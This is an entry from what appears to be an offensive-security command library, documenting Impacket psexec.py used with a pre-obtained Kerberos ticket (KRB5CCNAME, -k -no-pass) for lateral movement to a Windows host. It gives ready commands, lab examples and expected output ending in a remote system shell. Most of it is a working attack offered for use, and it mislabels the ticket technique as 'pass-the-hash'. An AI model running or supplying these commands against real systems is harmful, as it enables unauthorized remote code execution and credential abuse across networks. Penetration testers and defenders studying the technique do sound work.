---
type: command
executor: bash
data: >-
  export KRB5CCNAME="$_CCACHE_FILE" && python psexec.py
  "$_DOMAIN/$_USERNAME@$_TARGET_HOST" -k -no-pass
tags:
  - lateral-movement
  - remote-execution
platforms:
  - Linux
  - Windows
verified: true
validated: true
---

# authenticate-with-psexec-using-tgt

## Command

```bash
export KRB5CCNAME="$_CCACHE_FILE"
python psexec.py "$_DOMAIN/$_USERNAME@$_TARGET_HOST" -k -no-pass
```

## Description

This command sets the Kerberos credential cache and uses Impacket's psexec.py to execute commands on a remote Windows host via SMB, authenticating with a pre-obtained TGT for pass-the-hash lateral movement.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_CCACHE_FILE | Path to the Kerberos ccache file containing the TGT | Yes |
| $_DOMAIN | Domain name | Yes |
| $_USERNAME | Username for authentication | Yes |
| $_TARGET_HOST | Target hostname or IP | Yes |
| -k | Use Kerberos authentication from ccache | Built-in |
| -no-pass | Do not prompt for password | Built-in |

## Examples

### Basic Usage

```bash
export KRB5CCNAME="/tmp/velociraptor.ccache"
python psexec.py "lab.ropnop.com/velociraptor@labwws02.lab.ropnop.com" -k -no-pass
```

### Advanced Usage

```bash
export KRB5CCNAME="$CCACHE" && python psexec.py "$DOMAIN/$USER@$TARGET" -k -no-pass -debug
```

## Expected Output

Impacket v0.9.24 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on labwws02.lab.ropnop.com.....
[*] Found writable share ADMIN$
[*] Uploading file...
[*] Opening SVCManager on labwws02.lab.ropnop.com...
[*] Creating service...
Impacket v0.9.24 - Copyright 2020 SecureAuth Corporation

C:\Windows\system32> 

This shows successful remote shell access.

## Related

- [[procedures/OverPass-the-Hash-with-Impacket]]
- [[commands/get-tgt-using-nt-hash]]
